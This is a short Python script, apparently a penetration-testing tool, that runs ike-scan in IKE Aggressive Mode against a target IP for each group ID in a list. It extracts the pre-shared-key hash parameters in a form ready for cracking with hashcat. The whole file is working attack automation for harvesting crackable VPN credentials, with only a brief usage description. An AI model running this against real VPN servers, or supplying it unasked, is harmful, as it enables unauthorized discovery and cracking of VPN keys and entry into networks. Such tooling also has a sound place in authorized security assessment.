#!/usr/bin/python3

import argparse
import subprocess
import sys
import time

parser = argparse.ArgumentParser(description='This tool retrieves PSK Aggressive Mode hashes for each groupID in the file provided and outputs them ready for hashcat. The aim is to identify valid groupIDs by cracking their PSK. The cracking process is very resource consuming and should be used when no other attack on IKE has worked.')
parser.add_argument("groupIDs",type=str,help="file containing groupIDs")
parser.add_argument("target",type=str,help="target IP address (IKE server)")
parser.add_argument("-o","--output",type=str,help="file to save PSKs to",default="console")
parser.add_argument("-t","--transforms",type=str,help="IKE configuration to use")
parser.add_argument("-d","--delay",type=int,help="delay time between connections, in seconds",default=1)
args = parser.parse_args()

dictionary_id_psk={}
with open(args.groupIDs, "r") as IDs:		
	for groupID in IDs:
		command_list = ["ike-scan",args.target,"-A","-P","--id="+groupID.rstrip()]
		if args.transforms is not None:
			command_list.append('-trans='+args.transforms)
		output = str(subprocess.check_output(command_list))
		try:
			extracted_psk = (output.split("IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):")[1]).split("\\n")[1]
		except IndexError:
			print("Could not retrieve PSK for this groupID: " + groupID)
			continue
		dictionary_id_psk[groupID]=extracted_psk
		print("Retrieved handshake for: " + groupID + "\n" + extracted_psk + "\n" + "="*100)
		time.sleep(args.delay)

if args.output == "console":
	print("The following PSKs were retrieved and are ready to crack:")
	for key,value in dictionary_id_psk.items():
		print(value+"\n")
else:
	with open(args.output, "w") as pskfile:
			for key,value in dictionary_id_psk.items():
				pskfile.write(value+"\n")
